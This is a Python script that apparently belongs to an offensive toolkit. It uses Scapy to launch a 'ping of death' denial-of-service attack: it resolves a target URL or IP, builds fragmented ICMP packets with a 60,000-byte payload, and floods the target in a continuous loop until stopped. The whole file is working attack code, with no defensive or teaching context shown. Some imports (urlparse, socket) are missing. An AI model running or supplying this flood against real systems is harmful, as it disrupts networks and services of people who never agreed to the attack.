#! /usr/bin/python

from scapy.all import *
import sys
import colors
import time


class pingDeath(object):

    def __init__(self, ip, url):
        if url is not None and ip is not None:
            colors.error('Please provide either the URL or the IP address...')
            sys.exit(1)

        if ip is not None:
            self.target_ip = ip
        elif url is not None:
            self.target_ip = self.getIP(url)
        else:
            colors.error('Please provide URL or the IP address to attack...')

    @staticmethod
    def getIP(url):
        """
        Converts URL to IP
        """
        url = urlparse(url)
        return socket.gethostbyname(url.netloc)

    def generatePacket(self):
        """
        Generates scapy packet
        """
        IP_PACKET = IP(dst=self.target_ip)
        PKT = fragment(IP_PACKET/ICMP()/("X"*60000))
        return PKT

    @staticmethod
    def sendPacket(packet):
        """
        Sends the generated packets to the destination
        """
        send(packet, verbose=False, loop=1)

    def attack(self):
        newPacket = self.generatePacket()
        self.sendPacket(newPacket)

    def startAttack(self):

        try:
            colors.info('Ping of death attack on: {}'
                        .format(self.target_ip))

            colors.success('Ping of death attack started, press CTRL+C to '
                           'stop...')

            t1 = time.time()
            self.attack()

        except KeyboardInterrupt:
            t2 = time.time()
            colors.success('Completed in time: {}'.format(t2-t1))
